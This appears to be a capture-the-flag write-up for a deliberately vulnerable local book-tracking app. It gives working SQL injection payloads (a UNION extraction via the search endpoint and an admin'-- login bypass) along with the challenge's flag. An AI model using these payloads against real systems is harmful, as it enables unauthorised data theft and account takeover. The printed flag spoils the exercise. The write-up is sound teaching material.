# BookTracker SQLi Lab Write-Up

This write-up follows one of the cleanest beginner-to-intermediate solve paths in the current version of the challenge: use the unauthenticated search endpoint to perform a UNION-based extraction from `admin_secrets` and recover the flag.

The updated UI points players toward several routes, but this path is still the fastest reliable solve because:

- It does not require authentication.
- The response is structured JSON, which makes exfiltration easy to read.
- The vulnerable query shape is straightforward once you count columns correctly.

---

## Objective

Recover the training flag from the `admin_secrets` table.

Based on the seeded data documented in the repo, the flag is stored under:

- Table: `admin_secrets`
- Key: `FLAG`

---

## 1. Recon

When the app loads, the lobby presents several route-oriented targets. For a beginner solve, the best target is:

- `GET /api/search?q=`

From the backend and README, the vulnerable query is:

```sql
SELECT id, book_title, author, progress_percentage, user_id
FROM reading_progress
WHERE book_title LIKE '%<USER_INPUT>%' OR author LIKE '%<USER_INPUT>%'
```

Important observations:

1. User input is placed inside a quoted `LIKE '%...%'` pattern.
2. We can break out with a single quote.
3. The original query returns 5 columns.
4. A UNION payload must also return 5 columns.

---

## 2. Confirm Injection

Send a quote to see whether the endpoint breaks:

```bash
curl "http://localhost:3000/api/search?q='"
```

In this lab, SQL errors are intentionally verbose. A broken quote is a strong indicator that the input is being concatenated directly into SQL.

---

## 3. Build A UNION Payload

We want to append rows from `admin_secrets`, which contains:

- `id`
- `key`
- `value`

The original query returns 5 columns, so we pad the last two with dummy values.

Working payload:

```text
' UNION SELECT id, key, value, 'x', 'y' FROM admin_secrets--
```

Why it works:

- `'` closes the original `LIKE '%...` string
- `UNION SELECT ...` appends our chosen rows
- `--` comments out the trailing `%' OR author LIKE ...`

---

## 4. Extract The Flag

Run:

```bash
curl "http://localhost:3000/api/search?q=' UNION SELECT id,key,value,'x','y' FROM admin_secrets--"
```

The response format from this endpoint is:

```json
{
  "results": [
    {
      "id": 1,
      "book_title": "FLAG",
      "author": "DevNull{sql_injection_master_2025}",
      "progress_percentage": "x",
      "user_id": "y"
    }
  ],
  "count": 1
}
```

The search route maps our UNION output onto the original column names:

- `key` becomes `book_title`
- `value` becomes `author`

So the flag is:

```text
DevNull{sql_injection_master_2025}
```

---

## 5. Why This Is The Intended Easy Path

Compared to the other routes shown in the lobby, this one is friendlier for beginners:

- No cookie handling required
- No stored input or second trigger required
- No timing inference required
- No need to abuse authenticated routes first

It teaches the core SQLi workflow:

1. Find the injectable parameter.
2. Identify the SQL context.
3. Match column count.
4. UNION in data from another table.
5. Read the secret from the remapped output.

---

## 6. Common Mistakes

### Wrong column count

If your UNION returns fewer or more than 5 columns, SQLite will reject the query.

### Forgetting the comment

Without `--`, the original trailing `%'` remains and usually breaks the SQL.

### Using the wrong table shape

`admin_secrets` does not naturally match the search output, so you must remap it:

```sql
id, key, value, 'x', 'y'
```

### Assuming the response will use original table column names

It will not. The JSON keys still reflect the original search query:

- `id`
- `book_title`
- `author`
- `progress_percentage`
- `user_id`

---

## 7. Alternate Solve Path

If you want a more CTF-style chain instead of the direct search solve, another route is:

1. Bypass login with:

```bash
curl -i -X POST http://localhost:3000/login \
  -d "username=admin'--&password=test"
```

2. Reuse the returned cookies against authenticated surfaces.
3. Explore `/api/books`, `/api/notes`, `/api/profile`, or `/api/admin/query`.

That path is good practice, but it is not the simplest route to the flag.

---

## Final Flag

```text
DevNull{sql_injection_master_2025}
```
